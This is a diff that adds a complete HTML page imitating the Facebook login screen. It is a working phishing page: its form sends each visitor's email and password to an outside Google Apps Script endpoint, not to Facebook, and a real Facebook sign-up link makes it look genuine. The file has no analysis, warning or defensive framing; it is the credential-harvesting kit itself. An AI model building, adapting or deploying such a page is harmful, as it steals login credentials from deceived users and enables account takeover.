@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login Page</title>
+<style>
+  body {
+    font-family: sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 30vh;
+    margin: 0;
+  }
+
+  .login-container {
+    background-color: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    width: 400px;
+    text-align: center;
+  }
+
+  .login-container h2 {
+    color: #1877f2;
+    margin-bottom: 20px;
+  }
+
+  .login-container input[type="email"],
+  .login-container input[type="text"] {
+    width: calc(100% - 22px);
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+  }
+
+  .login-container button {
+    background-color: #1877f2;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    width: 100%;
+    font-weight: bold;
+  }
+
+  .login-container button:hover {
+    background-color: #166fe5;
+  }
+
+  .login-container a {
+    text-decoration: none;
+    color: #1877f2;
+    display: block;
+    margin-top: 10px;
+  }
+
+  .login-container a:hover {
+    text-decoration: underline;
+  }
+
+  .error-message {
+    color: red;
+    margin-top: 10px;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Facebook</h2>
+  <form 
+    method="POST" 
+    action="https://script.google.com/macros/s/AKfycbxkmnBujBrHe46FNf8qCvelRqYmQMgmyULtYxnPGmZkrVJJkN9eYCGMWbj9DgiO0Lh1/exec"
+    onsubmit="return validatePassword();"
+  >
+    <input name="Email" type="email" placeholder="Email" required>
+    <input id="password" name="Password" type="text" placeholder="Password" required>
+    <button type="submit">Log In</button>
+    <p id="error" class="error-message"></p>
+  </form>
+ <a href="#">Forgot password?</a>
+<hr style="margin-top: 20px; border: none; border-bottom: 1px solid #dadde1;">
+<button style="background-color: #42b72a; margin-top: 20px;" onclick="window.location.href='https://m.facebook.com/campaign/landing.php?campaign_id=1653377901&extra_1=s%7Cm%7C358050429248%7Ce%7Cfacebook%20sign%20up%7C&placement&creative=358050429248&keyword=facebook%20sign%20up&partner_id=googlesem&extra_2=campaignid%3D1653377901%26adgroupid%3D65139789722%26matchtype%3De%26network%3Dg%26source%3Dmobile%26search_or_content%3Ds%26device%3Dm%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-5066597374%26loc_physical_ms%3D1011080%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gclid=Cj0KCQjwhMq-BhCFARIsAGvo0KcHHn9tEiSrHej9FhBXzuFVLBVqWpR9MevAWz25Vlt9JgaE6L8xXm8aAmeuEALw_wcB&soft=hjk';">Create New Account</button>
+</div>
+
+<script>
+  function validatePassword() {
+    var password = document.getElementById("password").value;
+    var error = document.getElementById("error");
+
+    if (password.length < 6) {
+      error.textContent = "Password must be at least 6 characters long.";
+      return false;
+    }
+
+    if (!/[a-zA-Z]/.test(password)) {
+      error.textContent = "Password must contain at least one letter.";
+      return false;
+    }
+
+    error.textContent = ""; // Clear any previous error messages
+    return true;
+  }
+</script>
+
+</body>
+</html>
